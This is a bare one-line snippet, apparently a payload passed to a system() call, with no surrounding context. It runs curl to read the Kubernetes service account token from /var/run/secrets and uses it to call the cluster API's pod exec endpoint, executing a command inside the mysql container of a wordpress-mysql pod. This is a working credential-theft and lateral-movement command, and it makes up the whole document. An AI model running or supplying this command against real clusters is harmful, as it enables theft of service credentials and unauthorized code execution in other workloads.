<pre>
system("curl -k   --http1.1   -H \"Sec-WebSocket-Key: SGVsbG8sIHdvcmxkIQ==\"   -H \"Sec-WebSocket-Version: 13\"   -i -N   -H \"Connection: Upgrade\"   -H \"Upgrade: websocket\"   -H \"Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\"   \"https://kubernetes.default.svc/api/v1/namespaces/default/pods/wordpress-mysql-5dcfb54f74-cvzfh/exec?command=whoami&container=mysql&stdin=true&stdout=true&stderr=true\"");
</pre>
